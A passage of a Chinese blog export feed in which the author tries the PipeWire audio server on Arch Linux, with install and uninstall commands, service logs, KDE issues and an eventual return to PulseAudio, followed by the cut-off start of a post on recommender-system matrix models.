  </entry>
  <entry>
    <title>Linux新一代音视频服务Pipewire尝鲜</title>
    <url>/pipewire/</url>
    <content><![CDATA[<p>听说fedora都上Pipiwire了，正好这几天有点空，那就试试吧 <a id="more"></a></p>
<p>Pipewire是红帽造的新一代音视频轮子，主要是用来取代PulseAudio、jack还有gstreams什么的。 <strong>据说</strong>延迟补偿还不错，<strong>据说</strong>能统一音视频框架还兼容PulseAudio和Jack，据说是朝着专业级音效去的。据说支持Wayland和平板，据说支持Flatpak之类的容器内使用，据说有类似PolKit的权限管理，不需要像PulseAudio那样新建音频用户组和添加用户了。。。。</p>
<blockquote>
<p>It provides a low-latency, graph based processing engine on top of audio and video devices that can be used to support the use cases currently handled by both pulseaudio and JACK. PipeWire was designed with a powerful security model that makes interacting with audio and video devices from containerized applications easy, with supporting Flatpak applications being the primary goal. Alongside Wayland and Flatpak we expect PipeWire to provide a core building block for the future of Linux application development.</p>
</blockquote>
<p>都是据说啊，被Wayland骗了一次之后我已经不敢信这些宣传了，先试试实际效果再说。</p>
<p>当然这个目前貌似只正经适配了GNOME和Fedora，不过据说兼容PulseAudio，Arch上的坑已经有人踩了好久了，现在还有点小问题，不过可以考虑上了。 昨天刚把Arch和笔记本的EndeavourOS更了python 3.9，除了autojump出了点小问题外一切正常。索性直接上Pipewire看看吧，反正笔记本那个全损音质也跟没有一样，换了说不定能抢救一下。</p>
<h2 id="安装">安装</h2>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> pacman -S pipewire<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>要替代PulseAudio和Jack装这两个包<code>pipewire-pulse</code>、<code>pipewire-jack-dropin</code>。</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">yay -S pipewire-jack-dropin pipewire-pulse<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>然后systemd设置一下（archwiki说蓝牙设备需要手动设置一下，编辑<code>/etc/pipewire/pipewire.conf</code>，我手头没蓝牙耳机就不弄了）</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">systemctl <span class="token builtin class-name">enable</span> --user pipewire-pulse<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>然后退出登录或重启。</p>
<p>运行<code>pactl info</code>，如果看到</p>
<pre class="line-numbers language-log" data-language="log"><code class="language-log">Server Name: PulseAudio (on PipeWire 0.3.17)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>说明正常。</p>
<h3 id="蓝牙设备">蓝牙设备</h3>
<p>感谢室友赞助的一个索尼蓝牙音箱用于测试</p>
<p>pipewire自带了蓝牙的模块，不需要像PulseAudio那样安装<code>pulseaudio-bluetooth</code>之类的包</p>
<p>安装了pipewire-pulse之后编辑<code>/etc/pipewire/pipewire.conf</code>在<code>exec /usr/bin/pipewire-media-session</code>后面加上<code>-e bluez5</code>就可以使用了。</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">exec</span> /usr/bin/pipewire-media-session -e bluez5<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h2 id="卸载">卸载</h2>
<p>换回PulseAudio或者Jack可以用这个<span class="exturl" data-url="aHR0cHM6Ly9naXRsYWIuZnJlZWRlc2t0b3Aub3JnL3BpcGV3aXJlL3BpcGV3aXJlLy0vc25pcHBldHMvMTE2NA==">脚本<i class="fa fa-external-link-alt"></i></span></p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> /usr/lib64/

<span class="token function">sudo</span> <span class="token function">rm</span> /usr/lib64/libpulse-mainloop-glib.so.0.999.0
<span class="token function">sudo</span> <span class="token function">rm</span> /usr/lib64/libpulse-simple.so.0.999.0
<span class="token function">sudo</span> <span class="token function">rm</span> /usr/lib64/libpulse.so.0.999.0

<span class="token function">sudo</span> <span class="token function">rm</span> /usr/lib64/libjack.so.0.999.0
<span class="token function">sudo</span> <span class="token function">rm</span> /usr/lib64/libjacknet.so.0.999.0
<span class="token function">sudo</span> <span class="token function">rm</span> /usr/lib64/libjackserver.so.0.999.0

<span class="token function">sudo</span> ldconfig<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>用pacman包管理器装的就</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">systemctl disable pipewire-pulse --user
systemctl disable pipewire --user
yay -Rs pipewire-pulse
yay -S pulseaudio<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="更新一点实测">更新一点实测</h2>
<h3 id="人耳效果和使用体验">人耳效果和使用体验</h3>
<p>昨天回到宿舍，发现笔记本的EndeavourOS更新python 3.9 Optimus-manager 出问题了，好在很快解决了。 然后在工具人室友的帮助下测试了绿联的外接声卡一块、某大法耳机一个音响一个，傻多戴显示器自带小音箱一个，均工作正常。</p>
<p><img src="/pipewire/1607053618.png" /> <img src="/pipewire/1607053601.png" /></p>
<p>两种音质人耳都听不出差别，室友把两段音频放到Adobe Audition也看不出什么大区别</p>
<p>笔记本自带外放在KDE的设置中从其他音频播放设备切换过去之后出现没有声音的状况，经检查其实是有的，只是非常小，将声音调整到最大还是几乎要被笔记本的风扇声音盖住（这貌似不是pipewire的锅，），重启后外放音量恢复正常。 除了笔记本自带外放，在笔记本上音频切换KDE设置都没有出现卡死的状况，，声音也播放正常，没出现切换之后没声了的状况。</p>
<h3 id="面板参数">面板参数</h3>
<p>笔记本使用原来的PulseAudio详情：</p>
<pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml">Server String<span class="token punctuation">:</span> /run/user/1000/pulse/native
Library Protocol Version<span class="token punctuation">:</span> <span class="token number">34</span>
Server Protocol Version<span class="token punctuation">:</span> <span class="token number">34</span>
Is Local<span class="token punctuation">:</span> yes
Client Index<span class="token punctuation">:</span> <span class="token number">16</span>
Tile Size<span class="token punctuation">:</span> <span class="token number">65472</span>
User Name<span class="token punctuation">:</span> zjk
Host Name<span class="token punctuation">:</span> zjk<span class="token punctuation">-</span><span class="token number">7591</span>
Server Name<span class="token punctuation">:</span> pulseaudio
Server Version<span class="token punctuation">:</span> <span class="token number">14.0</span>
Default Sample Specification<span class="token punctuation">:</span> s16le 2ch 44100Hz
Default Channel Map<span class="token punctuation">:</span> front<span class="token punctuation">-</span>left<span class="token punctuation">,</span>front<span class="token punctuation">-</span>right
Default Sink<span class="token punctuation">:</span> alsa_output.pci<span class="token punctuation">-</span>0000_00_1f.3<span class="token punctuation">-</span>platform<span class="token punctuation">-</span>skl_hda_dsp_generic.HiFi__hw_sofhdadsp__sink
Default Source<span class="token punctuation">:</span> combined.monitor
<span class="token key atrule">Cookie</span><span class="token punctuation">:</span> 94e6<span class="token punctuation">:</span>e6bf<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>更换pipewire-pulse之后：</p>
<pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml">Server String<span class="token punctuation">:</span> /run/user/1000/pulse/native
Library Protocol Version<span class="token punctuation">:</span> <span class="token number">34</span>
Server Protocol Version<span class="token punctuation">:</span> <span class="token number">34</span>
Is Local<span class="token punctuation">:</span> yes
Client Index<span class="token punctuation">:</span> <span class="token number">69</span>
Tile Size<span class="token punctuation">:</span> <span class="token number">65472</span>
User Name<span class="token punctuation">:</span> zjk
Host Name<span class="token punctuation">:</span> zjk<span class="token punctuation">-</span><span class="token number">7591</span>
Server Name<span class="token punctuation">:</span> PulseAudio (on PipeWire 0.3.17)
Server Version<span class="token punctuation">:</span> 14.0.0
Default Sample Specification<span class="token punctuation">:</span> float32le 2ch 48000Hz
Default Channel Map<span class="token punctuation">:</span> front<span class="token punctuation">-</span>left<span class="token punctuation">,</span>front<span class="token punctuation">-</span>right
Default Sink<span class="token punctuation">:</span> <span class="token key atrule">alsa_output.pci-0000:00:1f.3-platform-skl_hda_dsp_generic.HiFi</span><span class="token punctuation">:</span> hw<span class="token punctuation">:</span>sofhdadsp<span class="token punctuation">,</span><span class="token key atrule">5</span><span class="token punctuation">:</span> sink
Default Source<span class="token punctuation">:</span> <span class="token key atrule">alsa_input.pci-0000:00:1f.3-platform-skl_hda_dsp_generic.HiFi</span><span class="token punctuation">:</span> <span class="token key atrule">hw:sofhdadsp</span><span class="token punctuation">:</span> source
<span class="token key atrule">Cookie</span><span class="token punctuation">:</span> 6242<span class="token punctuation">:</span><span class="token number">4425</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>看起来参数是好了一点，实测听不出来。</p>
<h3 id="其他">其他</h3>
<p>据说pipewire音视频延迟低了，手头没有专业设备没法测。其他的混响、均衡、采样手头没有专业设备也测不出来。</p>
<p>视频的话，浏览器HTML5播放器和本地VLC能正常播放。笔记本播放youtube4k视频外接4k显示器硬解没有大问题。VLC播放用N卡（笔记本的1650）解码也没有问题，驱动正常。</p>
<p>其他的视频方面和屏幕共享之类的功能暂时还没有测试。我也找不到熟悉视频的工具人了，等找到了再说吧，自己瞎测估计也测不出什么来。</p>
<h2 id="体验">体验</h2>
<h3 id="音质">音质</h3>
<p><code>pw-cli</code>显示的台式机面板参数</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ pw-cli info <span class="token number">0</span>
        id: <span class="token number">0</span>
        permissions: rwxm
        type: PipeWire:Interface:Core/3
        cookie: <span class="token number">653542227</span>
        user-name: <span class="token string">"zjk"</span>
        host-name: <span class="token string">"zjk-allseries"</span>
        version: <span class="token string">"0.3.17"</span>
        name: <span class="token string">"pipewire-0"</span>
*       properties:
*               core.name <span class="token operator">=</span> <span class="token string">"pipewire-0"</span>
*               context.profile.modules <span class="token operator">=</span> <span class="token string">"none"</span>
*               core.daemon <span class="token operator">=</span> <span class="token string">"true"</span>
*               link.max-buffers <span class="token operator">=</span> <span class="token string">"16"</span>
*               default.clock.rate <span class="token operator">=</span> <span class="token string">"48000"</span>
*               default.clock.quantum <span class="token operator">=</span> <span class="token string">"1024"</span>
*               default.clock.min-quantum <span class="token operator">=</span> <span class="token string">"32"</span>
*               default.clock.max-quantum <span class="token operator">=</span> <span class="token string">"8192"</span>
*               default.video.width <span class="token operator">=</span> <span class="token string">"640"</span>
*               default.video.height <span class="token operator">=</span> <span class="token string">"480"</span>
*               default.video.rate.num <span class="token operator">=</span> <span class="token string">"25"</span>
*               default.video.rate.denom <span class="token operator">=</span> <span class="token string">"1"</span>
*               mem.allow-mlock <span class="token operator">=</span> <span class="token string">"true"</span>
*               cpu.max-align <span class="token operator">=</span> <span class="token string">"32"</span>
*               object.id <span class="token operator">=</span> <span class="token string">"0"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>教研室的Arch台式机的老声卡接耳机和外接绿联声卡接耳机看不出什么大的区别。 Arch开Virtualbox里的win7能用，但是音质不知道为什么变差了特别多。</p>
<p>只有笔记本外放音质确实好了一点，我的笔记本外放能听出差别的那种，然而还是比win10差了不少（这个没有参考价值，我的笔记本Realtek驱动太阴间了）。<br />
据说延迟低了，这个听不出来，手头上也没有专业设备。</p>
<p>其他的等我的校交响乐团的工具人室友回来了再说。</p>
<h3 id="遇到的问题">遇到的问题</h3>
<p>目前使用的问题大概有：</p>
<ol type="1">
<li><code>systemctl status --user pipewire-pulse</code>报错</li>
</ol>
<pre class="line-numbers language-log" data-language="log"><code class="language-log">● pipewire-pulse.service - PipeWire PulseAudio
     Loaded: loaded (&#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;user&#x2F;pipewire-pulse.service; enabled; vendor preset: enabled)
     Active: active (running) since Thu 2020-12-03 17:10:09 CST; 12min ago
TriggeredBy: ● pipewire-pulse.socket
   Main PID: 1787 (pipewire-pulse)
     CGroup: &#x2F;user.slice&#x2F;user-1000.slice&#x2F;user@1000.service&#x2F;app.slice&#x2F;pipewire-pulse.service
             └─1787 &#x2F;usr&#x2F;bin&#x2F;pipewire-pulse

12月 03 17:17:02 zjk-allseries pipewire-pulse[1787]: core 0x55fc6c39e410: proxy 0x55fc6c39e410 id:0: bound:-1 seq:1272 res:-32 (Broken pipe) msg:&quot;connection error&quot;
12月 03 17:17:25 zjk-allseries pipewire-pulse[1787]: pulse-server 0x55fc6c30c300: [Google Chrome] ERROR command:42 (FLUSH_PLAYBACK_STREAM) tag:168 error:5 (No such file or directory)
12月 03 17:17:25 zjk-allseries pipewire-pulse[1787]: pulse-server 0x55fc6c30c300: [Google Chrome] ERROR command:41 (CORK_PLAYBACK_STREAM) tag:169 error:5 (No such file or directory)
12月 03 17:17:26 zjk-allseries pipewire-pulse[1787]: pulse-server 0x55fc6c30c300: [Google Chrome] ERROR command:41 (CORK_PLAYBACK_STREAM) tag:170 error:5 (No such file or directory)
12月 03 17:19:16 zjk-allseries pipewire-pulse[1787]: pulse-server 0x55fc6c3deb80: [code] ERROR command:18 (PLAY_SAMPLE) tag:3 error:5 (No such file or directory)
12月 03 17:19:16 zjk-allseries pipewire-pulse[1787]: pulse-server 0x55fc6c3deb80: [code] ERROR command:18 (PLAY_SAMPLE) tag:4 error:5 (No such file or directory)
12月 03 17:19:16 zjk-allseries pipewire-pulse[1787]: pulse-server 0x55fc6c3deb80: [code] ERROR command:18 (PLAY_SAMPLE) tag:5 error:5 (No such file or directory)
12月 03 17:19:17 zjk-allseries pipewire-pulse[1787]: pulse-server 0x55fc6c3deb80: [code] ERROR command:18 (PLAY_SAMPLE) tag:6 error:5 (No such file or directory)
12月 03 17:19:18 zjk-allseries pipewire-pulse[1787]: pulse-server 0x55fc6c3deb80: [code] ERROR command:18 (PLAY_SAMPLE) tag:7 error:5 (No such file or directory)
12月 03 17:19:18 zjk-allseries pipewire-pulse[1787]: pulse-server 0x55fc6c3deb80: [code] ERROR command:18 (PLAY_SAMPLE) tag:8 error:5 (No such file or directory)
***
12月 03 18:58:02 zjk-allseries pipewire-pulse[1787]: pulse-server 0x55fc6c37c6f0: [VirtualBox] ERROR command:23 (GET_SOURCE_INFO) tag:249 error:5 (No such file or directory)
12月 03 19:00:16 zjk-allseries pipewire-pulse[1787]: pulse-server 0x55fc6c37c6f0: [VirtualBox] ERROR command:23 (GET_SOURCE_INFO) tag:376 error:5 (No such file or directory)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>不过貌似都不影响使用</p>
<ol start="2" type="1">
<li>KDE调节音量的按钮换了之后经常卡死（KDE下面整个任务栏都卡死了），恢复之后调节音量无效</li>
</ol>
<p><img src="/pipewire/1606991672.png" /></p>
<ol start="3" type="1">
<li>KDE音频切换设置偶尔卡死</li>
</ol>
<p>下图这个</p>
<p><img src="/pipewire/1606992266.png" /> <img src="/pipewire/1606992430.png" /></p>
<p>点终止之后整个plasma桌面都无了</p>
<p><img src="/pipewire/1606992508.png" /></p>
<ol start="4" type="1">
<li><p>上图中的Build-in Audio切换之后耳机没有声音</p></li>
<li><p>切换外放麦克风和耳机之后再切回来没声了</p></li>
<li><p>有几个人之前说virtualbox会冲突，我这暂时没遇到</p></li>
<li><p>2021.2更新后再次出问题了,<code>pw-cli info 0</code>显示</p></li>
</ol>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Error: <span class="token string">"failed to connect: Host is down"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>检查了一下发现systemd daemon不知道怎么没了。</p>
<pre class="line-numbers language-none"><code class="language-none">Unit pipewire.service could not be found.
Unit pipewire-pulse.service could not be found.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>执行<code>systemctl enable pipewire --user</code>后重启还是找不到</p>
<p><code>systemctl status pipewire-pulse --user</code></p>
<p>报错：</p>
<pre class="line-numbers language-log" data-language="log"><code class="language-log">● pipewire-pulse.service - PipeWire PulseAudio
     Loaded: loaded (&#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;user&#x2F;pipewire-pulse.service; enabled; vendor preset: enabled)
     Active: active (running) since Sun 2021-02-14 10:03:07 CST; 12min ago
TriggeredBy: ● pipewire-pulse.socket
   Main PID: 1168 (pipewire-pulse)
     CGroup: &#x2F;user.slice&#x2F;user-1000.slice&#x2F;user@1000.service&#x2F;app.slice&#x2F;pipewire-pulse.service
             └─1168 &#x2F;usr&#x2F;bin&#x2F;pipewire-pulse

2月 14 10:15:40 zjk-7591 pipewire-pulse[1168]: pulse-server 0x557a2d6b64f0: failed to connect client: Host is down
2月 14 10:15:40 zjk-7591 pipewire-pulse[1168]: pulse-server 0x557a2d6ceab0: [QPulse] ERROR command:9 (SET_CLIENT_NAME) tag:1 error:6 &gt;
2月 14 10:15:41 zjk-7591 pipewire-pulse[1168]: pulse-server 0x557a2d6b64f0: failed to connect client: Host is down
2月 14 10:15:41 zjk-7591 pipewire-pulse[1168]: pulse-server 0x557a2d6e1cb0: [QPulse] ERROR command:9 (SET_CLIENT_NAME) tag:1 error:6 &gt;
2月 14 10:15:42 zjk-7591 pipewire-pulse[1168]: pulse-server 0x557a2d6b64f0: failed to connect client: Host is down<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="退坑保平安">退坑保平安</h3>
<p>换回PulseAudio了，不当小白鼠了，心累，好几次升级都有小问题，每次内核更新提心吊胆的。</p>
<p>2021.2</p>
<p>最近更新了Pipewire和kernel，开机加载界面的时候只加载出壁纸，kwin慢了十秒，Pipewire daemon加载失败，不想修了，直接换回PulseAudio。</p>
<p>在Pipewire出1.0稳定版和正式支持KDE之前一直用PulseAudio了。</p>
<!-- 如果需要屏幕共享，chrome需要启用WebRTC PipWire支持`chrome://flags/#enable-webrtc-pipewire-capturer`，可能需要用`libpipewire02` -->
<h2 id="参见">参见</h2>
<p><span class="exturl" data-url="aHR0cHM6Ly9waXBld2lyZS5vcmcv">https://pipewire.org/<i class="fa fa-external-link-alt"></i></span><br />
<span class="exturl" data-url="aHR0cHM6Ly93aWtpLmFyY2hsaW51eC5vcmcvaW5kZXgucGhwL1BpcGVXaXJl">https://wiki.archlinux.org/index.php/PipeWire<i class="fa fa-external-link-alt"></i></span><br />
<span class="exturl" data-url="aHR0cHM6Ly96aC53aWtpcGVkaWEub3JnL3dpa2kvUHVsc2VBdWRpbw==">https://zh.wikipedia.org/wiki/PulseAudio<i class="fa fa-external-link-alt"></i></span><br />
<span class="exturl" data-url="aHR0cHM6Ly9sd24ubmV0L0FydGljbGVzLzczNDEwMy8=">https://lwn.net/Articles/734103/<i class="fa fa-external-link-alt"></i></span><br />
<span class="exturl" data-url="aHR0cHM6Ly9ibG9ncy5nbm9tZS5vcmcvdXJhZXVzLzIwMjAvMDkvMDQvcGlwZXdpcmUtbGF0ZS1zdW1tZXItdXBkYXRlLTIwMjAv">https://blogs.gnome.org/uraeus/2020/09/04/pipewire-late-summer-update-2020/<i class="fa fa-external-link-alt"></i></span><br />
<span class="exturl" data-url="aHR0cHM6Ly9naXRsYWIuZnJlZWRlc2t0b3Aub3JnL3BpcGV3aXJlL3BpcGV3aXJlLy0vd2lraXMvTGltaXRhdGlvbnMtaW4tMC4z">pipewire 0.3的一些局限和问题<i class="fa fa-external-link-alt"></i></span></p>
<h2 id="番外arch滚动更新pyhton3.9">番外：Arch滚动更新pyhton3.9</h2>
<p>昨天晚上回去本来想直接装上pipewire试一下的，结果发现我笔记本外接4k显示器只有一个最高2k的显示选项。而且开机的混合驱动变成只有Intel集显了。</p>
<p>检查了一下是更新python3.9后optimus-manager坏了。</p>
<p>到群里看了一下好多都是因为Optimus Manger更新出了问题，貌似这此升级python3.9的桌面用户黑屏进不去的基本都是Nvidia显卡，Optimus-manager出问题直接SDDM进不去了。</p>
<p>本来以为出问题的只有一个autojump</p>
<pre class="line-numbers language-log" data-language="log"><code class="language-log">  File &quot;&#x2F;usr&#x2F;bin&#x2F;autojump&quot;, line 39, in &lt;module&gt;
    from autojump_argparse import ArgumentParser
ModuleNotFoundError: No module named &#39;autojump_argparse&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>然后检查了一下python 3.8 升级 python 3.9 失败的包</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> /usr/lib/python3.8/site-packages<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">/usr/lib/python3.8/site-packages $ <span class="token function">ls</span>
optimus_manager  optimus_manager-1.3-py3.8.egg-info  __pycache__  tcping-0.1.1rc1-py3.8.egg-info  tcping.py<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>只有Optimus,autojump和tcping，还好。</p>
<p>重新rebuild编译一下然后再重启Optimus Manager就好了，其他几个同理（如果还不行就用python 3.8 rebuild）</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">yay -Rsc optimus-manager-qt
yay -S optimus-manager-qt <span class="token comment"># package to clean build 选 ALL</span>
<span class="token function">sudo</span> systemctl <span class="token builtin class-name">enable</span> optimus-manager
<span class="token function">sudo</span> systemctl start optimus-manager<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>相关issue见 <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0Fza2Fubnovb3B0aW11cy1tYW5hZ2VyL2lzc3Vlcy8xNzQ=">https://github.com/Askannz/optimus-manager/issues/174<i class="fa fa-external-link-alt"></i></span></p>
]]></content>
      <categories>
        <category>不务正业系列</category>
      </categories>
      <tags>
        <tag>pipewire</tag>
      </tags>
  </entry>
  <entry>
    <title>推荐系统笔记</title>
    <url>/bccd/</url>
    <content><![CDATA[<p>要啥DNN、LSTM、BERT啊，真用起来FM就完事了 <a id="more"></a></p>
<h2 id="推荐系统的简单模型">推荐系统的简单模型</h2>
<p>在处理文章、记录、电子病历、购物记录等真实数据时，常常将用户和文本对应，用横纵坐标分别代表用户（m个人）和对应的物品、浏览记录（n个），以每个二维坐标的数值代表用户的喜好程度或浏览时长，可以将用户和物品的关系对应表示成一个<span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.025ex" xmlns="http://www.w3.org/2000/svg" width="6.11ex" height="1.136ex" role="img" focusable="false" viewBox="0 -491 2700.4 502"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D45A" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(1100.2, 0)"><path data-c="D7" d="M630 29Q630 9 609 9Q604 9 587 25T493 118L389 222L284 117Q178 13 175 11Q171 9 168 9Q160 9 154 15T147 29Q147 36 161 51T255 146L359 250L255 354Q174 435 161 449T147 471Q147 480 153 485T168 490Q173 490 175 489Q178 487 284 383L389 278L493 382Q570 459 587 475T609 491Q630 491 630 471Q630 464 620 453T522 355L418 250L522 145Q606 61 618 48T630 29Z"></path></g><g data-mml-node="mi" transform="translate(2100.4, 0)"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g></g></g></svg></mjx-container></span>的矩阵<span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: 0" xmlns="http://www.w3.org/2000/svg" width="1.697ex" height="1.62ex" role="img" focusable="false" viewBox="0 -716 750 716"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D434" d="M208 74Q208 50 254 46Q272 46 272 35Q272 34 270 22Q267 8 264 4T251 0Q249 0 239 0T205 1T141 2Q70 2 50 0H42Q35 7 35 11Q37 38 48 46H62Q132 49 164 96Q170 102 345 401T523 704Q530 716 547 716H555H572Q578 707 578 706L606 383Q634 60 636 57Q641 46 701 46Q726 46 726 36Q726 34 723 22Q720 7 718 4T704 0Q701 0 690 0T651 1T578 2Q484 2 455 0H443Q437 6 437 9T439 27Q443 40 445 43L449 46H469Q523 49 533 63L521 213H283L249 155Q208 86 208 74ZM516 260Q516 271 504 416T490 562L463 519Q447 492 400 412L310 260L413 259Q516 259 516 260Z"></path></g></g></g></svg></mjx-container></span>（在推荐系统中通常称为评分矩阵）。这样，在分析不同用户评分或喜好相似程度，不同物品间受欢迎的关联程度等问题都可以转化为矩阵和向量的计算。</p>
<p>假设user对item的打分<span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.357ex" xmlns="http://www.w3.org/2000/svg" width="2.837ex" height="2.088ex" role="img" focusable="false" viewBox="0 -765 1254 922.8"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="TeXAtom" data-mjx-texclass="ORD"><g data-mml-node="mover"><g data-mml-node="mi" transform="translate(24.5, 0)"><path data-c="1D45F" d="M21 287Q22 290 23 295T28 317T38 348T53 381T73 411T99 433T132 442Q161 442 183 430T214 408T225 388Q227 382 228 382T236 389Q284 441 347 441H350Q398 441 422 400Q430 381 430 363Q430 333 417 315T391 292T366 288Q346 288 334 299T322 328Q322 376 378 392Q356 405 342 405Q286 405 239 331Q229 315 224 298T190 165Q156 25 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 114 189T154 366Q154 405 128 405Q107 405 92 377T68 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(55.6, -29)"><path data-c="5E" d="M112 560L249 694L257 686Q387 562 387 560L361 531Q359 532 303 581L250 627L195 580Q182 569 169 557T148 538L140 532Q138 530 125 546L112 560Z"></path></g></g></g><g data-mml-node="TeXAtom" transform="translate(555.6, -150) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><path data-c="1D462" d="M21 287Q21 295 30 318T55 370T99 420T158 442Q204 442 227 417T250 358Q250 340 216 246T182 105Q182 62 196 45T238 27T291 44T328 78L339 95Q341 99 377 247Q407 367 413 387T427 416Q444 431 463 431Q480 431 488 421T496 402L420 84Q419 79 419 68Q419 43 426 35T447 26Q469 29 482 57T512 145Q514 153 532 153Q551 153 551 144Q550 139 549 130T540 98T523 55T498 17T462 -8Q454 -10 438 -10Q372 -10 347 46Q345 45 336 36T318 21T296 6T267 -6T233 -11Q189 -11 155 7Q103 38 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mi" transform="translate(572, 0)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g></g></g></g></svg></mjx-container></span>由下式决定</p>
